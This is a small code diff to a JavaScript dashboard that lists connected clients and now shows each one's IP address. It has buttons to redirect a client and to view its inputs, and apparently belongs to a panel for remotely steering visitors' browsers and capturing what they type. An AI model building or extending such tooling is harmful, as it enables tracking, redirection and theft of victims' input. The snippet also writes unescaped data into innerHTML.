@@ -30,7 +30,7 @@
         const clientDiv = document.createElement('div');
         clientDiv.classList.add('client');
         clientDiv.innerHTML = `
-          <h3>Client: ${client.name || client.clientId}</h3>
+          <h3>Client: ${client.name || client.clientId} Ip: ${client.ip}</h3>
           <button onclick="sendCommand('${client.clientId}', 'redirect1')">Redirect 1</button>
           <button onclick="sendCommand('${client.clientId}', 'redirect2')">Redirect 2</button>
           <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
